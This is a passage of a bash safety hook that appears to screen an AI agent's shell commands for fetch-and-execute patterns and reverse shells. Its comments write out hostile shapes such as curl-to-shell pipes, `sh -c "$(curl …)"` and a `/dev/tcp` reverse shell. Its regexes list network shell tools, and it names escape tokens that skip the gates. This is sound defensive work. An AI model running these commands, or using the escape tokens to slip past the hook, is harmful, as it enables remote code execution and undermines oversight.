# fetch-execute, one space apart. Not a new rule, a missing spelling of an
# existing one, so it joins the family here and inherits lockfile → local →
# pinned rather than getting a parallel check of its own.
NPX_CMD_REGEX="^(npx|bunx|npm${NPX_GLOBAL_FLAGS}[[:space:]]+exec|pnpm${NPX_GLOBAL_FLAGS}[[:space:]]+dlx|yarn${NPX_GLOBAL_FLAGS}[[:space:]]+dlx|bun${NPX_GLOBAL_FLAGS}[[:space:]]+x)([[:space:]]|$)"
runner=""
npx_seg=""
NPX_SEGMENTS=$(s8_split_segments "$SANITIZED_CMD")
while IFS= read -r nseg; do
  nseg="${nseg#"${nseg%%[![:space:]]*}"}"; nseg="${nseg%"${nseg##*[![:space:]]}"}"
  [[ -n "$nseg" ]] || continue
  nseg="${nseg#[({]}"; nseg="${nseg#"${nseg%%[![:space:]]*}"}"
  # Strip env-var assignments + transparent exec-wrappers (shared s8_strip_wrappers,
  # same set as the rm gate). Order: this runs AFTER the `${nseg#[({]}` opener-strip
  # above (the rm gate runs its strip BEFORE — that asymmetry is load-bearing and
  # preserved; see s8_strip_wrappers header).
  nseg=$(s8_strip_wrappers "$nseg")
  # Canonicalize the command word (basename + strip a leading backslash) so
  # `\npx` / `/usr/bin/npx` at command position match what the shell EXECs.
  ncmd="${nseg%%[[:space:]]*}"; ncmd="${ncmd#\\}"; ncmd="${ncmd##*/}"
  seg_canon="$ncmd${nseg#"${nseg%%[[:space:]]*}"}"
  if printf '%s' "$seg_canon" | grep -qE "$NPX_CMD_REGEX"; then
    runner=$(printf '%s' "$seg_canon" | grep -oE "$NPX_CMD_REGEX" | head -n1 | sed -E 's/[[:space:]]+$//')
    npx_seg="$seg_canon"
    break
  fi
done <<< "$NPX_SEGMENTS"

if [[ -n "$runner" ]]; then
  bypass_npx=0
  if echo "$CMD" | grep -qF '[allow-npx-unpinned]'; then
    bypass_npx=1
    # `runner` is already resolved here (npx / bunx / `bun x` / `npm exec` / …),
    # so the record can name WHICH ecosystem's hatch was used. The package token
    # is not yet extracted at this point and is deliberately not recomputed —
    # a second extraction would be a duplicate of the one below and free to drift.
    hook_record pre-bash-safety bypass-escape-hatch \
      "{\"token\":\"allow-npx-unpinned\",\"runner\":$(printf '%s' "$runner" | jq -R .)}" \
      '§8-npx' "$SESSION_ID" "$TOOL_USE_ID"
    # One overridden tool call must produce ONE row per token+section. Pattern 2b
    # records the same token and section, and a compound command can trip both
    # (`npx pkg && cargo install --git …` emitted two, verified) — which inflates
    # the numerator doctor.js compares against its >50% bypass:deny demotion
    # threshold, i.e. it would push a healthy gate toward being demoted.
    _npx_bypass_recorded=1
  fi

  if (( bypass_npx == 0 )); then
    # Resolve the cwd npx will actually run in (follows leading `cd <dir>`).
    NPX_EFFECTIVE_CWD=$(effective_npx_cwd "$EVENT_CWD" "$SANITIZED_CMD_FLAT")
    # Take everything after the first `npx ` up to a command terminator.
    npx_tail="${npx_seg#"$runner"}"; npx_tail="${npx_tail#"${npx_tail%%[![:space:]]*}"}"
    pkg_token=""
    skip_next=0
    no_install=0
    for tok in $npx_tail; do
      if (( skip_next == 1 )); then
        pkg_token="$tok"
        break
      fi
      case "$tok" in
        -p|--package|-c|--call) skip_next=1 ;;
        # v0.23.19 — --no-install (npx v6) / --no (npm 7+) forbid registry
        # fetch: npx runs an already-installed binary or exits non-zero, so
        # no unknown-origin code can land — which is what the §8 NPX chain
        # guards. Only flags BEFORE the package name count (loop breaks at
        # the first non-flag token; trailing flags belong to the package).
        --no-install|--no) no_install=1 ;;
        --*=*|--*|-[a-zA-Z]) continue ;;
        *) pkg_token="$tok"; break ;;
      esac
    done
    if [[ -n "$pkg_token" && $no_install -eq 1 ]]; then
      hook_record pre-bash-safety npx-allow-no-install "{\"pkg\":\"$pkg_token\"}" '§8-npx' "$SESSION_ID" "$TOOL_USE_ID"
      pkg_token=""
    fi
    if [[ -n "$pkg_token" ]]; then
      case "$pkg_token" in
        ./*|/*|../*) ;;                       # local path — allow
        *@[0-9]*|*@latest|*@next|*@beta|*@alpha) ;;  # pinned — allow
        @*/*@*) ;;                            # scoped + pin — allow
        *)
          # Unpinned (scoped or unscoped). Per spec §8 lockfile → local → pinned:
          # check lockfile/node_modules in EVENT_CWD before denying.
          if npx_pkg_locally_resolved "$pkg_token" "$NPX_EFFECTIVE_CWD"; then
            hook_record pre-bash-safety npx-allow-local "{\"pkg\":\"$pkg_token\"}" '§8-npx' "$SESSION_ID" "$TOOL_USE_ID"
          else
            case "$pkg_token" in
              @*/*) HITS+=("$runner $pkg_token (scoped, unpinned, no lockfile/local)")
                    HIT_SECTIONS+=('§8-npx')
                    REASONS+=$'\n  - '"$runner"' unpinned scoped package (no lockfile/local in '"${NPX_EFFECTIVE_CWD:-<no-cwd>}"'): '"$pkg_token" ;;
              *)    HITS+=("$runner $pkg_token (unpinned, no lockfile/local)")
                    HIT_SECTIONS+=('§8-npx')
                    REASONS+=$'\n  - '"$runner"' unpinned package (no lockfile/local in '"${NPX_EFFECTIVE_CWD:-<no-cwd>}"'): '"$pkg_token" ;;
            esac
          fi
          ;;
      esac
    fi
  fi
fi

# Pattern 2b (F40, 2026-07-28): package runners whose ARGUMENT is the remote
# thing. Same §8 clause as Pattern 2 and the same escape token — the NPX rule's
# subject is fetch-execute-unknown-origin as a CLASS, not the literal word npx
# (feedback_s8_false_negative_audit) — but the judgment is different in kind and
# so is the code. Pattern 2 gets a bare package NAME and must ask a registry
# question (lockfile → local → pinned). These forms carry the remote reference
# in the command line itself: a URL, a VCS scheme, an unpinned module@version, a
# remote flakeref. Nothing needs resolving; the argument's SHAPE is the verdict.
#
# Measured asymmetry that motivated this: `npx some-unknown-pkg` and
# `bunx some-unknown-pkg` denied, while `uvx`, `pipx run`, `deno run <URL>`,
# `pip install git+…`, `cargo install --git`, `go run …@latest` and `nix run
# github:…` all allowed. One action, blocked in the JS ecosystem and waved
# through everywhere else.
#
# Every rule below is written so the FP twin fails it STRUCTURALLY rather than by
# exception list — the local/pinned spelling simply does not contain the token:
#   deno   remote specifier (https:// npm: jsr:) vs `deno run ./main.ts`. Flags
#          are consumed first, so `--allow-net=https://api` on a LOCAL script is
#          not a remote argument (that URL is a permission, not the program).
#   pip    `git+`/`hg+`/`svn+`/`bzr+`, or a URL naming an artifact
#          (.tar.gz/.tgz/.zip/.whl). NOT a bare URL: `-i`/`--index-url`/
#          `--extra-index-url`/`--find-links` all take registry URLs and are
#          ordinary, so requiring the artifact suffix keeps them out without an
#          exclusion list to maintain.
#   cargo  `--git` (remote) vs `--path` / a registry name like `cargo install ripgrep`.
#   go     `module@latest|master|main|HEAD` — UNPINNED only. `@v0.1.12` and a
#          commit sha stay allowed, mirroring Pattern 2's pinned rule.
#   nix    a remote flakeref scheme vs `.#pkg` / `./#pkg` / no argument.
# `uvx TOOL` / `pipx run TOOL` are deliberately NOT here: their argument is a
# bare name, so they need Pattern 2's resolution, not this shape test. Deferred
# with that reason recorded (tasks/audit-2026-07-27-deferred.md §E).
REMOTE_RUN_DENY=""
# Machine-readable twin of the human sentence, for the bypass record: telemetry
# needs a stable key to group on, and a prose reason is not one.
REMOTE_RUN_RULE=""
_npx_bypass_recorded="${_npx_bypass_recorded:-0}"
while IFS= read -r rseg; do
  [[ -z "$rseg" ]] && continue
  rseg=$(s8_strip_wrappers "$rseg")
  rseg=$(canon_cmd_words "$rseg")
  rseg="${rseg#"${rseg%%[![:space:]]*}"}"
  case "$rseg" in
    deno*|pip*|python*|uv[[:space:]]*|cargo*|go[[:space:]]*|nix*) ;;
    *) continue ;;
  esac
  if printf '%s' "$rseg" | grep -qE '^deno[[:space:]]+(run|install|eval|bundle|compile|cache)([[:space:]]+-[^[:space:]]+)*[[:space:]]+(https?://|npm:|jsr:)'; then
    REMOTE_RUN_DENY="deno runs a remote module specifier"; REMOTE_RUN_RULE="deno-remote-specifier"
  elif printf '%s' "$rseg" | grep -qE '^(pip3?|python3?[[:space:]]+-m[[:space:]]+pip|uv[[:space:]]+pip)[[:space:]]+install([[:space:]]|$)' \
       && printf '%s' "$rseg" | grep -qE '([[:space:]]|=)((git|hg|svn|bzr)\+[^[:space:]]+|https?://[^[:space:]]*\.(tar\.gz|tgz|zip|whl))([[:space:]]|$)'; then
    REMOTE_RUN_DENY="pip installs from a VCS or artifact URL (runs setup code from an unpinned source)"; REMOTE_RUN_RULE="pip-vcs-or-artifact-url"
  elif printf '%s' "$rseg" | grep -qE '^cargo[[:space:]]+install([[:space:]]|$)' \
       && printf '%s' "$rseg" | grep -qE '[[:space:]]--git([[:space:]]|=)'; then
    REMOTE_RUN_DENY="cargo install --git builds and installs from a remote repository"; REMOTE_RUN_RULE="cargo-install-git"
  elif printf '%s' "$rseg" | grep -qE '^go[[:space:]]+(run|install|get)([[:space:]]|$)' \
       && printf '%s' "$rseg" | grep -qE '[[:space:]][^[:space:]]+\.[a-z]{2,}/[^[:space:]]*@(latest|master|main|HEAD|upgrade|patch)([[:space:]]|$)'; then
    REMOTE_RUN_DENY="go run/install of an UNPINNED remote module (@latest/@main)"; REMOTE_RUN_RULE="go-unpinned-remote-module"
  elif printf '%s' "$rseg" | grep -qE '^nix[[:space:]]+(run|shell|develop|build|profile)([[:space:]]+-[^[:space:]]+)*[[:space:]]+(github|gitlab|sourcehut|flake|tarball|git\+https?|https?):'; then
    REMOTE_RUN_DENY="nix runs a remote flake reference"; REMOTE_RUN_RULE="nix-remote-flakeref"
  fi
  [[ -n "$REMOTE_RUN_DENY" ]] && break
done < <(s8_split_segments "$SANITIZED_CMD")

if [[ -n "$REMOTE_RUN_DENY" ]]; then
  if echo "$CMD" | grep -qF '[allow-npx-unpinned]'; then
    if (( _npx_bypass_recorded == 0 )); then
      hook_record pre-bash-safety bypass-escape-hatch \
        "{\"token\":\"allow-npx-unpinned\",\"rule\":$(printf '%s' "$REMOTE_RUN_RULE" | jq -R .)}" \
        '§8-npx' "$SESSION_ID" "$TOOL_USE_ID"
    fi
  else
    HITS+=("package runner executing an unknown-origin remote reference")
    HIT_SECTIONS+=('§8-npx')
    REASONS+=$'\n  - '"$REMOTE_RUN_DENY"
  fi
fi

# Pattern 3: pipe / process-substitute a network fetch into a shell interpreter
# — spec §8 "execute scripts of unknown origin". The LEFT side must be a network
# fetch (curl/wget) in COMMAND position; `cat local.sh | sh` / `echo cmd | bash`
# are known-origin and stay allowed (no curl/wget), and non-shell sinks
# (`| jq`, `| tar`) do not match (the pipe target must be sh/bash/zsh/dash/ksh/
# ash, optionally via sudo). Per-pipeline-segment (split on newline / ; / && /
# ||) so a curl in one command and a `| sh` in the next never cross-match.
# Matches on SANITIZED_CMD (quotes/heredoc/comments stripped) so a curl|sh
# quoted in prose does not fire; unwrap_indirect already exposed the inner of
# `sh -c "curl x | sh"`. Command-substitution form `eval "$(curl x)"` is a
# documented residual (tasks/s8-false-negative-audit-2026-07-03.md). 2026-07-03
# §8 false-negative audit: this class had no detector at all.
bypass_curlsh=0
if echo "$CMD" | grep -qF '[allow-curl-sh]'; then bypass_curlsh=1; fi
# Command-position anchor `[|;&({]` includes `{` so a brace-group `{ curl … |
# sh; }` is caught like the subshell `( … )` form (code review 2026-07-03). A
# var like `${curl}` cannot false-match: the trailing `[[:space:]]` after curl
# requires a space, which `${curl}` (curl followed by `}`) never has.
# Transparent exec-wrappers on the SINK, at parity with the rm/npx gates (which
# strip env/command/nohup/setsid/time/busybox + nice/stdbuf/ionice/chrt/sudo/doas
# — see the segment loop ~line 528). The curl-sh gate is pure regex, so the same
# set is spelled here as an optional-repeated prefix: `curl | env bash`,
# `curl | command sh`, `curl | nice bash`, `curl | sudo env bash` (chains) all
# resolve to a shell running fetched code (2026-07-15 §8 FN audit F18, reproduced
# live). Residual (documented, same as the rm gate): `env FOO=x bash` /
# `FOO=x bash` (assignment args) and path-prefixed wrappers (`/usr/bin/env bash`)
# are not modeled in this single regex; `[allow-curl-sh]` is the escape.
#
# F19 (2026-07-25 audit): a WRAPPER occupying command position hid a path-
# prefixed / backslash-escaped fetch or sink binary from the global
# canon_cmd_words pass (:478) — `sudo /usr/bin/curl … | sh` and
# `curl … | sudo /bin/sh` both ALLOWed while the rm/npx gates re-canonicalize
# after their wrapper strip. Closure is the same canon-after-strip the sibling
# gates use (fetch side, loop below) plus CURLSH_SINKPFX tolerance for a path/
# backslash prefix on the sink word behind a wrapper (the sink is regex-matched,
# not word-looped, so canon cannot reach it there). Both are monotonic:
# canon/prefix-tolerance only expose tokens the shell EXECs, never hide one.
#
# Members MUST be a subset of S8_WRAP_ARGLESS ∪ S8_WRAP_FLAGGED (parity-tested in
# pre-bash-safety.test.sh — the single-source arrays and this regex cannot silently
# drift apart). Kept as a literal string, NOT rebuilt from the arrays: as a bare
# regex prefix a duration-taking wrapper can't match anyway (`timeout 5 bash` — the
# `5` breaks `(WRAP)*(sink)`), so `timeout` is deliberately absent; re-deriving the
# string from the full arrays would ADD `timeout` and flip `curl x | timeout bash`
# allow→deny — a verdict change, not a refactor. Shell keywords (do/then/else/!) are
# absent for the same reason a pipe sink is never a control-structure keyword.
CURLSH_WRAP='(sudo|doas|env|command|exec|nohup|setsid|time|busybox|nice|stdbuf|ionice|chrt)'
# F34 (2026-07-28, deferred item C closed): the alternation above consumes the
# wrapper WORD and nothing else, so every wrapper that carries an option pushed
# the sink one or two tokens right of where the regex looked and the gate fell
# through to ALLOW — `curl … | sudo -u root bash`, `| env -i bash`,
# `| nice -n 10 bash`, `| stdbuf -oL bash` were all live ALLOWs (8 of the 9 deny
# probes RED against the pre-fix hook; the 9th — `sudo -u svc bash <(curl …)` —
# already denied, because there the wrapper sits in COMMAND position and the
# fetch-side s8_strip_wrappers reached it. That asymmetry is the bug in one line:
# the same wrapper is understood before the pipe and not after it).
# This was documented-not-chased because the FETCH side got an
# optarg model in F24/F29 while the SINK side stayed a bare regex: one concept,
# two implementations, unequal power — the duplicated-seam shape the 2026-07-27
# audit found recurring. Closure keeps the sink in regex form (routing it through
# the word loop is not a local change) but gives that regex the same optarg model
# the word loop has: a flag, optionally followed by ONE bare-word argument.
#
# `-flag` is REQUIRED before a bare word is eaten, so a non-wrapper command word
# can never be consumed: `curl … | sudo mysql -e …` still finds no sink (mysql is
# a bare word with no preceding flag) and stays allowed. Widening a deny-on-match
# regex only ever moves allow→deny, so FP is the only risk direction — guarded by
# 7 F34-fp corpus rows (non-shell sinks behind the same optarg wrappers) plus a
# 405-row differential showing zero pre-existing verdict changes.
CURLSH_WRAPOPT='([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*'
# F35 (2026-07-28): F34 closed the option-with-arg half and left the
# ASSIGNMENT half, on the strength of a comment rather than a measurement. Probed:
# `curl … | FOO=x bash`, `| env FOO=x bash`, `| sudo FOO=x bash`, `| A=1 B=2 sh`
# were all ALLOW while the byte-identical prefix on the FETCH side
# (`FOO=x curl … | bash`) denied — so "both sides now understand the same wrapper
# grammar" was true for flags and false for assignments. Same seam, different
# token shape; the residual note was inherited from the pre-F34 comment and never
# re-measured. 8 of 9 deny probes RED (the 9th, `FOO=x bash <(curl …)`, already
# denied for the same command-position reason F34's 9th did).
#
# A bare assignment prefix (`FOO=x bash`) is not a wrapper argument at all — it is
# shell assignment-prefix syntax — so it joins the repeated unit as its own
# alternative rather than extending CURLSH_WRAPOPT. That covers assignment alone,
# wrapper-then-assignment, and assignment-then-wrapper in any order.
#
# FP direction is the only risk (widening a deny-on-match regex). The sink word
# after the prefix must still be exactly a shell name, so `| FOO=x jq .`,
# `| LC_ALL=C tee out`, and even `| SHELL=bash tee out` (shell name in the VALUE,
# not in command position) stay allowed — 6 F35-fp corpus rows pin those.
CURLSH_ASSIGNW='[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*'
CURLSH_WRAPSEQ="((${CURLSH_WRAP}${CURLSH_WRAPOPT}|${CURLSH_ASSIGNW})[[:space:]]+)*"
# Optional sink prefix: one leading backslash (`\bash`, alias-defeat) OR a
# path ending in `/` (`/bin/sh`, `/usr/local/bin/bash`). The path branch MUST
# end with `/` so `flash` / `./mysh` can never satisfy it — the shell word
# after the prefix still has to be exactly one of the sink names, keeping the
# non-shell-sink FP guard intact (F19).
CURLSH_SINKPFX='(\\|/[^[:space:]|;&]*/)?'
# --- The two tables this gate is actually made of (2026-07-28, F36) -----------
# Until now both were spelled inline: SOURCE was the literal `(curl|wget)` in two
# regexes, SINK was `(sh|bash|zsh|dash|ksh|ash)` in two more. A measurement of the
# whole fetch-execute class found five families the gate could not see, and they
# were not five defects — they were two tables that were too narrow. Naming them
# once is what keeps `| python3` from becoming its own hand-rolled regex with its
# own wrapper/optarg/assignment handling to drift out of sync (the seam shape the
# 2026-07-27 audit found recurring). Every shape below was probed ALLOW first.
#
# SOURCE = "brings bytes the user has not inspected into this pipeline".
#   HTTP fetchers beyond curl/wget: aria2c / axel / httpie / http / fetch /
#     lwp-request / lwp-download.
#   Raw sockets: nc / ncat / netcat / socat / telnet / openssl — `nc x.io 4444 |
#     bash` is the same structure as `curl … | bash`, minus the URL.
#   Non-HTTP transports: scp / sftp / rsync / ftp / tftp.
#   Decoders: base64 / xxd / gpg — `base64 -d payload.b64 | sh` is the classic
#     obfuscated-payload shape; the chain form (`curl … | base64 -d | sh`) already
#     denied because curl held command position, the bare local blob did not.
# `cat` is deliberately ABSENT: `cat script.py | python3` is ordinary local work,
# and adding it would turn every "read a file into an interpreter" into a deny.
# `git` is absent too — `--remote=` is the dangerous half and needs argument
# parsing, not a word-list entry (documented residual).
CURLSH_SRC='(curl|wget|aria2c|axel|httpie|http|fetch|lwp-request|lwp-download|nc|ncat|netcat|socat|telnet|openssl|scp|sftp|rsync|ftp|tftp|base64|xxd|gpg)'
# SINK-shell = Bourne family: stdin IS the script, with or without further args
# (`bash -s -- --flag` still executes stdin), so the loose boundary stays.
CURLSH_SHSINK='(sh|bash|zsh|dash|ksh|ash)'
# SINK-interpreter = runtimes that execute stdin as a PROGRAM only when invoked
# bare or with a lone `-`. This distinction is the whole reason interpreters need
# their own boundary: `curl … | python3` executes fetched code, while
# `curl … | python3 -m json.tool` and `curl … | perl -pe 's/x/y/'` are ordinary
# pretty-print / filter idioms where stdin is DATA. A shared boundary would have
# denied both. Hence `[;&|)}]|$` (end of command) rather than the shell family's
# `[[:space:])}]|$` (which permits trailing args).
CURLSH_INTERP='(python|python2|python3|perl|ruby|node|php|lua)'
CURLSH_SINKEXPR="(${CURLSH_SHSINK}([[:space:])}]|$)|${CURLSH_INTERP}([[:space:]]+-)?[[:space:]]*([;&|)}]|$)|awk[[:space:]]+-f[[:space:]]+-[[:space:]]*([;&|)}]|$))"
# F27 (2026-07-25 deep audit): three delivery shapes the pipe form did not model.
# `|&` is bash's pipe-stderr-too operator — a one-character variation on the
# canonical denied form; and a group opener (`| { bash; }`, `| (bash)`) pushes the
# sink one token right of where the regex looked. Both were live ALLOWs whose
# payload ran (sandbox-confirmed). The sink word itself is unchanged, so a
# non-shell group (`| { jq .; }`) still cannot match.
CURLSH_PIPE="(^|[|;&({])[[:space:]]*${CURLSH_SRC}[[:space:]].*\|&?[[:space:]]*([({][[:space:]]*)?${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_SINKEXPR}"
# `source` and `.` are builtins that EXECUTE their file argument in the current
# shell; `source <(curl x)` / `. <(curl x)` run fetched code just like `bash <(curl
# x)` (v0.39.0 §8 FN closure F4). `\.` = literal dot (command position), no FP —
# a bare `.` before ` <(curl…)` is only ever the source builtin. Same wrapper
# prefix as the pipe form (`env bash <(curl x)`); `source`/`.` are builtins so a
# wrapper before them never resolves, but the group is harmless there.
# F27, second half: `bash < <(curl …)` redirects stdin FROM the same process
# substitution this pattern already covers, but the regex required `<(` to follow
# the sink word directly. A local-file redirect (`bash < ./setup.sh`) still cannot
# match — the `<(` and the curl/wget word are both still required.
CURLSH_PROCSUB="(^|[|;&({])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}(source|\.|sh|bash|zsh|dash|ksh|ash)[[:space:]]+(<[[:space:]]*)?<\([[:space:]]*${CURLSH_SRC}[[:space:]]"
curlsh_hit=0
while IFS= read -r cseg; do
  # 2026-07-24 audit P1-1: strip leading subshell/brace openers, env-assignments
  # and transparent exec-wrappers from the FETCH side (shared s8_strip_wrappers —
  # parity with the rm/npx gates), so `sudo curl … | sh` / `FOO=1 curl … | sh` /
  # `nohup curl … | sh` deny like the bare form. The sink side already strips via
  # CURLSH_WRAP in the regex. Monotonic: stripping only ever removes a prefix,
  # exposing more text to a deny-on-match regex — no allow→deny flip is possible
  # for a segment whose stripped head is not curl/wget. Residuals (documented):
  # a wrapper after a mid-segment background `&` (`foo & sudo curl x | sh` — `&`
  # is not a split char here), and a herestring carrying a command substitution
  # (`sh <<< "$(curl x)"`, whose quoted body sanitize strips before any gate sees
  # it); [allow-curl-sh] is the escape. The two halves of the wrapper grammar were
  # closed on the FETCH side by this loop (F24 options, plus the assignment strip
  # it has always had) and on the SINK side by the regex: F34 gave it the optarg
  # model, F35 the assignment alternative. Both sides now understand the same
  # grammar — and that claim is pinned by corpus rows on BOTH sides of the pipe
  # for each shape, not by this comment. F34 shipped carrying the sentence "the
  # remaining residual is the assignment form", inherited from the pre-F34 text
  # and never re-measured; it was wrong the moment it was written, because the
  # fetch side already denied `FOO=x curl … | bash`.
  cseg="${cseg#"${cseg%%[![:space:]]*}"}"
  # Perf guard, verdict-neutral: both CURLSH regexes require one of the literal
  # SOURCE words, and neither strip nor canon can CREATE one (basename of a path
  # containing curl still contains curl) — a segment without any of them can
  # never match, so skip the strip/canon/grep spawns entirely.
  #
  # Matched against CURLSH_SRC ITSELF, not a hand-written mirror of it. The first
  # draft of this widening did spell the word list out a second time as a `case`,
  # and that copy is a silent-bypass generator: a word added to the regex but
  # forgotten here makes the gate `continue` past the very segment it was just
  # taught to catch, with every corpus row still green. Rather than add a parity
  # test to police the copy, there is no copy — one definition, used twice.
  # (shellcheck also caught the mirror as redundant: `*http*` shadows `*httpie*`,
  # `*nc*` shadows `*ncat*`/`*socat*`, `*ftp*` shadows `*sftp*`/`*tftp*` — a
  # by-hand list of overlapping substrings cannot even be written correctly.)
  # `[[ =~ ]]` is a bash builtin: no subshell, so this stays the cheap pre-check
  # it was, and it is bash 3.2-safe (unquoted RHS = regex).
  [[ "$cseg" =~ $CURLSH_SRC ]] || continue
  while [[ "$cseg" == \(* || "$cseg" == \{* ]]; do
    cseg="${cseg#?}"; cseg="${cseg#"${cseg%%[![:space:]]*}"}"
  done
  cseg=$(s8_strip_wrappers "$cseg")
  # F19: re-canonicalize command-position words after the wrapper strip — the
  # global :478 canon ran while the wrapper still held command position, so a
  # path/backslash-prefixed fetch binary behind `sudo `/`env ` kept its prefix
  # (`sudo /usr/bin/curl` → strip → `/usr/bin/curl`, canon → `curl`). Same
  # canon-after-strip order the rm (:626) and npx (:864) gates already use.
  cseg=$(canon_cmd_words "$cseg")
  if echo "$cseg" | grep -qE "$CURLSH_PIPE" || echo "$cseg" | grep -qE "$CURLSH_PROCSUB"; then
    curlsh_hit=1
    # Which SOURCE and which SINK, for the bypass record. Only the two command
    # WORDS — never the URL, which can carry credentials (§8: no sensitive data
    # in logs) and answers a question nobody is asking. Computed only on a hit,
    # so the cost is off the common path.
    # The sink is read from the text after the LAST pipe, not by scanning the
    # whole segment (2026-07-28 review). An unanchored search with `tail -1` took
    # the last substring match anywhere, so
    # `curl … | bash > out.sh` logged sink=`sh` — from the FILENAME. `.sh` is the
    # single most likely token to appear in exactly these commands, so the field
    # this release adds would have been wrong in its most common case. The
    # procsub form has no pipe; there `${cseg##*|}` is the whole segment and the
    # first sink word is still the right answer.
    _curlsh_src=$(printf '%s' "$cseg" | grep -oE "$CURLSH_SRC" | head -1)
    _curlsh_sink=$(printf '%s' "${cseg##*|}" | grep -oE "(${CURLSH_SHSINK}|${CURLSH_INTERP})" | head -1)
    break
  fi
done < <(printf '%s\n' "$SANITIZED_CMD" \
  | awk '{ line=(h==""?$0:h" "$0); if (line ~ /(^|[^|])\|[[:space:]]*$/){h=line;next} print line; h="" } END{ if(h!="")print h }' \
  | sed -E 's/&&/\n/g; s/\|\|/\n/g; s/;/\n/g')
# The awk pass joins a pipe-then-newline continuation (`curl x |⏎bash`, a valid
# shell pipeline the line-based grep would otherwise split) before segmenting.
# A line ending in a SINGLE `|` continues the pipeline; `||` (OR-list) is NOT
# joined — the regex requires a non-`|` before the trailing `|` — so it still
# segments on `||` below, keeping `curl x || bash` correctly out of the gate.
if (( curlsh_hit == 1 )); then
  if (( bypass_curlsh == 1 )); then
    hook_record pre-bash-safety bypass-escape-hatch \
      "{\"token\":\"allow-curl-sh\",\"shape\":\"pipe-or-procsub\",\"source\":$(printf '%s' "${_curlsh_src:-}" | jq -R .),\"sink\":$(printf '%s' "${_curlsh_sink:-}" | jq -R .)}" \
      '§8-curl-sh' "$SESSION_ID" "$TOOL_USE_ID"
  else
    HITS+=("network fetch piped or <()-substituted into a shell or interpreter (unknown-origin execution)")
    HIT_SECTIONS+=('§8-curl-sh')
    REASONS+=$'\n  - a fetch/transport command\'s output is executed by a shell or interpreter — unknown-origin code'
  fi
fi

# ---------------------------------------------------------------------------
# Pattern 3b (F37, 2026-07-28) — fetch-execute shapes that live INSIDE a quoted
# payload. Matched against NORMALIZED_CMD, because BOTH downstream transforms
# destroy the evidence before Pattern 3 above ever sees it:
#   - unwrap_indirect rewrites `sh -c "$(curl x)"` into `; $(curl x) ;`, which
#     keeps the fetch and throws away the SINK, so no `| sh` is left to match;
#   - sanitize_cmd then blanks quoted bodies, so the payload is gone too.
# That is why `sh -c "$(curl -fsSL …)"` — the form Homebrew, rustup and nvm all
# publish as their install command, i.e. the single most COPIED fetch-execute
# idiom there is — measured ALLOW right up to this release while the visually
# noisier `curl … | sh` denied.
#
# Anchored on the runner, not on `$(`: a bare `$(curl …)` elsewhere in a command
# is a substitution whose OUTPUT becomes an argument (`echo "$(curl …)"`), which
# is not execution. It is the `-c` / `eval` / `source` position that turns fetched
# bytes into shell source. `sh -c 'echo $(curl x)'` stays allowed for the same
# reason — the substitution runs inside and feeds echo's argv.
_ncmd_hit=0
_ncmd_rule=""
CURLSH_RUNNERC="(${CURLSH_SHSINK}([[:space:]]+-[a-zA-Z-]+)*[[:space:]]+-[a-zA-Z]*c[a-zA-Z]*|eval|source|\.)"
CURLSH_CMDSUB="(^|[|;&({])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_RUNNERC}[[:space:]]+[\"']?\\\$\\([[:space:]]*${CURLSH_SRC}[[:space:]]"
CURLSH_CMDSUB_BT="(^|[|;&({])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_RUNNERC}[[:space:]]+[\"']?\`[[:space:]]*${CURLSH_SRC}[[:space:]]"
if printf '%s' "$NORMALIZED_CMD" | grep -qE "$CURLSH_CMDSUB" \
   || printf '%s' "$NORMALIZED_CMD" | grep -qE "$CURLSH_CMDSUB_BT"; then
  _ncmd_hit=1
  _ncmd_reason='a shell runs the OUTPUT of a fetch as its command string (sh -c "$(curl …)")'
  _ncmd_rule='runner-cmdsubst'
fi

# Pattern 3c (F38) — transports whose execution is an ADDRESS, not a pipe.
# `socat TCP:host:port EXEC:/bin/bash` wires a socket straight to a shell with no
# `|` anywhere, and bash's own `/dev/tcp/host/port` needs no external binary at
# all (`bash -i >& /dev/tcp/h/p 0>&1` is the canonical one-line reverse shell).
# Neither can be expressed as SOURCE-pipe-SINK, so they get their own patterns.
# socat requires BOTH a network address AND an EXEC:/SYSTEM: address, so ordinary
# port-forwarding (`socat TCP-LISTEN:8080,fork TCP:localhost:3000`) cannot match.
#
# These two match SANITIZED_CMD, NOT the raw text (2026-07-28 review). Pattern 3's
# own header states it uses the sanitized view "so a curl|sh quoted in prose does
# not fire"; the first version of 3c silently dropped that invariant and the cost
# was immediate — `git commit -m "block /dev/tcp/1.2.3.4/4444 shells"` and
# `rg "/dev/tcp/…" tests/` both denied, i.e. the maintainer could not commit this
# release with a message naming the feature. unwrap_indirect still exposes real
# payloads (`bash -c "cat < /dev/tcp/h/p"`) before sanitize runs, so moving to the
# sanitized view costs no detection — it only stops matching quoted prose.
REVSH_SOCAT='socat[^|;&]*(TCP|TCP4|TCP6|UDP|OPENSSL|SSL)[^|;&]*(EXEC|SYSTEM):'
REVSH_DEVNET='/dev/(tcp|udp)/[^[:space:]/]+/[0-9]+'
if (( _ncmd_hit == 0 )); then
  if printf '%s' "$REVSH_VIEW" | grep -qE "$REVSH_SOCAT"; then
    _ncmd_hit=1; _ncmd_reason='socat wires a network address directly to EXEC:/SYSTEM: (reverse shell)'; _ncmd_rule='socat-exec'
  else
    # Loopback is exempt: `cat < /dev/tcp/localhost/5432` is the standard
    # wait-for-port idiom and a "reverse shell" to 127.0.0.1 is not a threat
    # model. Hosts are extracted and checked individually rather than excluded
    # inside the regex — ERE has no lookahead, and an exclusion spelled as a
    # character-class puzzle is the kind of thing that silently stops excluding.
    while IFS= read -r _dn_host; do
      [[ -z "$_dn_host" ]] && continue
      case "$_dn_host" in
        localhost|127.*|::1|0.0.0.0) continue ;;
      esac
      _ncmd_hit=1; _ncmd_reason='bash /dev/tcp|/dev/udp network redirection to a non-loopback host (reverse shell transport)'; _ncmd_rule='dev-tcp'
      break
    done < <(printf '%s' "$REVSH_VIEW" | grep -oE "$REVSH_DEVNET" | sed -E 's#/dev/(tcp|udp)/##; s#/[0-9]+$##')
  fi
fi

# Pattern 3d (F39) — interpreter one-liners that open a socket AND execute.
# Covers both directions of the same shape: the reverse shell
# (`perl -e 'use Socket;…;exec("/bin/sh -i");'`,
